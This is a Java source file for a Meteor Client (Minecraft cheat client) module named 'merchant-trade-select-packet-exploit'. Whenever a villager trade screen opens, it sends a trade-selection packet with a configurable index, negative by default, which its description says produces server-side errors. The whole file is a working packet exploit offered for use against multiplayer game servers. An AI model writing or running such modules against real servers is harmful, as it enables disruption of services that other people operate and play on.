package minegame159.meteorclient.modules.misc;

import meteordevelopment.orbit.EventHandler;
import minegame159.meteorclient.events.game.OpenVillagerGuiScreenEvent;
import minegame159.meteorclient.modules.Categories;
import minegame159.meteorclient.modules.Module;
import minegame159.meteorclient.settings.IntSetting;
import minegame159.meteorclient.settings.Setting;
import minegame159.meteorclient.settings.SettingGroup;
import minegame159.meteorclient.utils.player.ChatUtils;
import net.minecraft.network.packet.c2s.play.SelectMerchantTradeC2SPacket;

public class MerchantTradeSelectExploitModule extends Module {
    private final SettingGroup sgGeneral  = settings.getDefaultGroup();


    private final Setting<Integer> index = sgGeneral.add(new IntSetting.Builder()
            .name("index")
            .sliderMin(-50)
            .sliderMax(50)
            .min(Integer.MIN_VALUE)
            .max(Integer.MAX_VALUE)
            .defaultValue(-1)
            .build()
    );


    public MerchantTradeSelectExploitModule() {
        super(Categories.Misc,"merchant-trade-select-packet-exploit","Sends packets with a negative index to produce server side erros");
    }

    @EventHandler
    public void onVillagerGuiOpen(OpenVillagerGuiScreenEvent ignored) {
        assert mc.getNetworkHandler() != null;
        ChatUtils.moduleInfo(this,"Sending packet with index %d ",index.get());
        mc.getNetworkHandler().sendPacket(new SelectMerchantTradeC2SPacket(index.get()));
    }

}
